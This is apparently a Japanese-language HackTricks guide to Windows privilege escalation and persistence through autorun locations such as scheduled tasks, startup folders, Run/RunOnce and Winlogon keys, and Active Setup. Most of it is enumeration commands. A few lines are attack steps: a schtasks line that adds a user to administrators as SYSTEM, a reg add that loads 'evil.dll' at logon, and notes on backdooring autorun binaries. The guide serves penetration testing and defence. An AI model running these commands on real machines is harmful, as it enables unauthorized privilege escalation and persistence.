# Autorunsを使用した特権昇格

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic**は**スタートアップ**でプログラムを実行するために使用できます。スタートアップで実行されるようにプログラムされたバイナリを確認するには、次のコマンドを使用します:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## スケジュールされたタスク

**タスク**は**特定の頻度**で実行されるようにスケジュールできます。実行されるようにスケジュールされているバイナリを確認するには:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## フォルダ

**スタートアップフォルダにあるすべてのバイナリは、起動時に実行されます**。一般的なスタートアップフォルダは以下にリストされているものですが、スタートアップフォルダはレジストリに示されています。[Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## レジストリ

> [!NOTE]
> [ここからの注意](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** レジストリエントリは、64ビットのWindowsバージョンを実行していることを示します。オペレーティングシステムは、このキーを使用して、64ビットのWindowsバージョンで実行される32ビットアプリケーションのために、HKEY_LOCAL_MACHINE\SOFTWAREの別のビューを表示します。

### 実行

**一般的に知られている** AutoRunレジストリ:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** および **RunOnce** として知られるレジストリキーは、ユーザーがシステムにログインするたびにプログラムを自動的に実行するように設計されています。キーのデータ値として割り当てられたコマンドラインは、260文字以下に制限されています。

**サービスの実行**（ブート中のサービスの自動起動を制御可能）:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista以降のバージョンでは、**Run** および **RunOnce** レジストリキーは自動的に生成されません。これらのキーのエントリは、プログラムを直接起動するか、依存関係として指定することができます。たとえば、ログオン時にDLLファイルをロードするには、**RunOnceEx** レジストリキーと「Depend」キーを使用することができます。これは、システム起動時に「C:\temp\evil.dll」を実行するレジストリエントリを追加することで示されます:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Exploit 1**: **HKLM**内のいずれかのレジストリに書き込むことができれば、別のユーザーがログインしたときに特権を昇格させることができます。

> [!NOTE]
> **Exploit 2**: **HKLM**内のいずれかのレジストリに示されたバイナリを上書きできる場合、別のユーザーがログインしたときにそのバイナリをバックドアで変更し、特権を昇格させることができます。
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### スタートアップパス

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**スタートアップ**フォルダーに配置されたショートカットは、ユーザーのログオンまたはシステムの再起動時にサービスやアプリケーションを自動的に起動します。**スタートアップ**フォルダーの場所は、**ローカルマシン**と**現在のユーザー**のスコープの両方でレジストリに定義されています。これは、これらの指定された**スタートアップ**場所に追加されたショートカットが、ログオンまたは再起動プロセスに続いてリンクされたサービスやプログラムが起動することを保証することを意味し、プログラムを自動的に実行するための簡単な方法となります。

> [!NOTE]
> **HKLM**の下の任意の\[User] Shell Folderを上書きできる場合、あなたが制御するフォルダーを指すように設定でき、ユーザーがシステムにログインするたびに実行されるバックドアを配置することができます。
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

通常、**Userinit** キーは **userinit.exe** に設定されています。しかし、このキーが変更されると、指定された実行可能ファイルもユーザーログオン時に **Winlogon** によって起動されます。同様に、**Shell** キーは Windows のデフォルトシェルである **explorer.exe** を指すことを目的としています。
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> レジストリ値またはバイナリを上書きできる場合、特権を昇格させることができます。

### ポリシー設定

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** キーを確認してください。
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### セーフモードコマンドプロンプトの変更

Windowsレジストリの`HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`には、デフォルトで`cmd.exe`に設定された**`AlternateShell`**値があります。これは、起動時に「コマンドプロンプト付きセーフモード」を選択すると（F8を押すことによって）、`cmd.exe`が使用されることを意味します。しかし、F8を押して手動で選択することなく、このモードで自動的に起動するようにコンピュータを設定することが可能です。

「コマンドプロンプト付きセーフモード」で自動的に起動するためのブートオプションを作成する手順：

1. `boot.ini`ファイルの属性を変更して、読み取り専用、システム、隠しフラグを削除します: `attrib c:\boot.ini -r -s -h`
2. `boot.ini`を編集のために開きます。
3. 次のような行を挿入します: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini`への変更を保存します。
5. 元のファイル属性を再適用します: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell**レジストリキーを変更することで、カスタムコマンドシェルの設定が可能になり、不正アクセスの可能性があります。
- **Exploit 2 (PATH書き込み権限):** システムの**PATH**変数の任意の部分に書き込み権限があると、特に`C:\Windows\system32`の前にある場合、カスタム`cmd.exe`を実行でき、セーフモードでシステムが起動した場合はバックドアになる可能性があります。
- **Exploit 3 (PATHとboot.ini書き込み権限):** `boot.ini`への書き込みアクセスにより、自動的なセーフモード起動が可能になり、次回の再起動時に不正アクセスを容易にします。

現在の**AlternateShell**設定を確認するには、これらのコマンドを使用します:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### インストールされたコンポーネント

Active Setupは、**デスクトップ環境が完全にロードされる前に開始される**Windowsの機能です。これは、ユーザーログオンが進行する前に完了しなければならない特定のコマンドの実行を優先します。このプロセスは、RunやRunOnceレジストリセクションのような他のスタートアップエントリがトリガーされる前に発生します。

Active Setupは、以下のレジストリキーを通じて管理されます：

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

これらのキー内には、特定のコンポーネントに対応するさまざまなサブキーが存在します。特に注目すべきキー値には以下が含まれます：

- **IsInstalled:**
- `0`はコンポーネントのコマンドが実行されないことを示します。
- `1`はコマンドが各ユーザーごとに一度実行されることを意味し、`IsInstalled`値が欠如している場合のデフォルトの動作です。
- **StubPath:** Active Setupによって実行されるコマンドを定義します。`notepad`を起動するなど、任意の有効なコマンドラインである可能性があります。

**セキュリティインサイト：**

- **`IsInstalled`**が`"1"`に設定され、特定の**`StubPath`**を持つキーを変更または書き込むことは、権限昇格のための不正なコマンド実行につながる可能性があります。
- いかなる**`StubPath`**値で参照されるバイナリファイルを変更することも、十分な権限があれば権限昇格を達成する可能性があります。

Active Setupコンポーネント全体の**`StubPath`**設定を検査するには、これらのコマンドを使用できます：
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### ブラウザヘルパーオブジェクト

### ブラウザヘルパーオブジェクト (BHO) の概要

ブラウザヘルパーオブジェクト (BHO) は、Microsoft の Internet Explorer に追加機能を提供する DLL モジュールです。これらは、各起動時に Internet Explorer および Windows Explorer に読み込まれます。しかし、**NoExplorer** キーを 1 に設定することで実行をブロックでき、Windows Explorer インスタンスと共に読み込まれるのを防ぐことができます。

BHO は、Internet Explorer 11 を介して Windows 10 と互換性がありますが、最新の Windows バージョンのデフォルトブラウザである Microsoft Edge ではサポートされていません。

システムに登録されている BHO を調査するには、次のレジストリキーを確認できます：

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

各 BHO は、レジストリ内の **CLSID** によって表され、ユニークな識別子として機能します。各 CLSID に関する詳細情報は、`HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` の下にあります。

レジストリ内の BHO をクエリするには、次のコマンドを利用できます：
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer 拡張機能

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

レジストリには各 dll ごとに 1 つの新しいレジストリが含まれ、**CLSID** で表されます。CLSID 情報は `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` で見つけることができます。

### フォントドライバー

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### 画像ファイル実行オプション
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

autorunsを見つけることができるすべてのサイトは、**すでに**[**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)によって検索されています。しかし、**自動実行される**ファイルの**より包括的なリスト**については、Sysinternalsの[autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)を使用することができます:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**レジストリのような他のAutorunsを見つけるには** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)



{{#include ../../banners/hacktricks-training.md}}
